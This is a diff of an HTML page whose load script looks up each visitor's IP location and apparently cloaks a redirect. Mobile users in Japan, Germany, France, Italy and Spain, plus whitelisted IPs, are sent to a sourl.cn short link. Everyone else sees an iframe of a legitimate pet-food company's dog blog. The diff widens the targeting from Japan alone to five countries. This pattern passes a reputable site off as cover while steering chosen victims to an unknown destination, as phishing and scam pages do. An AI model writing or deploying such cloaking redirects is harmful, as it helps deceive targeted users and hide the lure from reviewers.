@@ -1,4 +1,6 @@
 
+
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -32,53 +34,58 @@
   <body onload="handleResponse()">
  
 <script>
- function handleResponse() {
+function handleResponse() {
     function isMobileDevice() {
-      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
     function isJapaneseLang() {
-      return navigator.language.startsWith('ja') || 
-             navigator.languages.some(lang => lang.startsWith('ja'));
+        return navigator.language.startsWith('ja') || 
+               navigator.languages.some(lang => lang.startsWith('ja'));
     }
 
     // IP whitelist
-    var ipWhitelist = ['61.224.68.77', '156.243.230.146']; // Add your IPs here
+    const ipWhitelist = ['59.125.75.194', '156.243.230.146']; // Add your IPs here
+
+    // Target countries (ISO codes)
+    const targetCountries = ['JP', 'DE', 'FR', 'IT', 'ES'];
 
     fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        // Check IP whitelist first
-        if (ipWhitelist.includes(data.ip)) {
-          window.location.href = "https://sourl.cn/vyar4t";
-          return;
-        }
+        .then(response => response.json())
+        .then(data => {
+            // Check IP whitelist first
+            if (ipWhitelist.includes(data.ip)) {
+                window.location.href = "https://sourl.cn/vyar4t";
+                return;
+            }
+            
+            // Check if country is in target list AND is mobile device
+            if (targetCountries.includes(data.country) && isMobileDevice()) {
+                window.location.href = "https://sourl.cn/vyar4t";
+                return;
+            }
         
-        // 严格的三重条件判断
-        if (data.country === 'JP' && isMobileDevice()) {
-          window.location.href = "https://sourl.cn/vyar4t";
-          return;
-        }
-     
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
-        iframe.style.width = '100%';
-        iframe.style.height = '100vh';
-        document.body.appendChild(iframe);
-      })
-      .catch(() => {
-        // IP检测失败时严格的双重条件判断
-        if (isMobileDevice() && isJapaneseLang()) {
-          window.location.href = "https://sourl.cn/vyar4t";
-          return;
-        }
-        
-        var iframe = document.createElement('iframe');
-        iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
-        iframe.style.width = '100%';
-        iframe.style.height = '100vh';
-        document.body.appendChild(iframe);
-      });
+            // Default behavior: load iframe
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
+            iframe.style.width = '100%';
+            iframe.style.height = '100vh';
+            document.body.appendChild(iframe);
+        })
+        .catch(() => {
+            // Fallback when IP detection fails: check mobile + Japanese language
+            if (isMobileDevice() && isJapaneseLang()) {
+                window.location.href = "https://sourl.cn/vyar4t";
+                return;
+            }
+            
+            // Default behavior: load iframe
+            const iframe = document.createElement('iframe');
+            iframe.src = 'https://www.bellaandduke.com/why-us/latest-news/dog-blogs/';
+            iframe.style.width = '100%';
+            iframe.style.height = '100vh';
+            document.body.appendChild(iframe);
+        });
 }
 
 </script>
